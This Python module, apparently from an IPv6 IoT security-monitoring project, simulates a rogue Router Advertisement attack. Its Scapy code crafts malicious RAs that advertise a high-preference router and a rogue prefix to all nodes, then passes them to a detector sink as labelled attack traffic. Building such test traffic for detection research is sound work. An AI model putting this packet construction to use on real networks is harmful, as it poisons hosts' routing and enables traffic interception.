"""
rogue_ra.py - Rogue Router Advertisement (RA) Attack Simulator
Privacy-Aware IPv6 IoT Security Monitoring Across Address Rotation

Simulates an unauthorized virtual router broadcasting malicious IPv6
Router Advertisement (RA) messages to poison the network routing table.
"""

import time
import threading
from typing import Optional, Callable

# Clean Scapy configuration
import scapy.config
scapy.config.conf.nameservers = ['8.8.8.8']
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo

class RogueRASimulator:
    def __init__(self, packet_sink: Optional[Callable[[any, bool], None]] = None,
                 rogue_src_ipv6: str = "2001:db8:1::bad:1",
                 rogue_prefix: str = "2001:db8:666::"):
        self.packet_sink = packet_sink
        self.rogue_src_ipv6 = rogue_src_ipv6
        self.rogue_prefix = rogue_prefix
        self.is_running = False
        self._thread: Optional[threading.Thread] = None
        self.interval_seconds = 2.0
        self.packets_sent = 0

    def craft_rogue_ra_packet(self):
        """Build Scapy ICMPv6 Router Advertisement from unauthorized router."""
        pkt = (
            IPv6(src=self.rogue_src_ipv6, dst="ff02::1", hlim=255) /
            ICMPv6ND_RA(chlim=64, routerlifetime=1800, prf="High") /
            ICMPv6NDOptPrefixInfo(prefix=self.rogue_prefix, prefixlen=64, L=1, A=1, validlifetime=7200)
        )
        return pkt

    def start(self, interval: float = 2.0) -> None:
        """Start background broadcast loop."""
        if self.is_running:
            return
        self.interval_seconds = interval
        self.is_running = True
        self._thread = threading.Thread(target=self._run_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Stop rogue RA broadcast."""
        self.is_running = False
        if self._thread:
            self._thread.join(timeout=1.0)
            self._thread = None

    def trigger_single_burst(self, count: int = 1):
        """Inject single or multiple rogue RA packets on demand."""
        for _ in range(count):
            pkt = self.craft_rogue_ra_packet()
            self.packets_sent += 1
            if self.packet_sink:
                self.packet_sink(pkt, True)  # tagged as ground truth attack

    def _run_loop(self) -> None:
        while self.is_running:
            self.trigger_single_burst(1)
            time.sleep(self.interval_seconds)

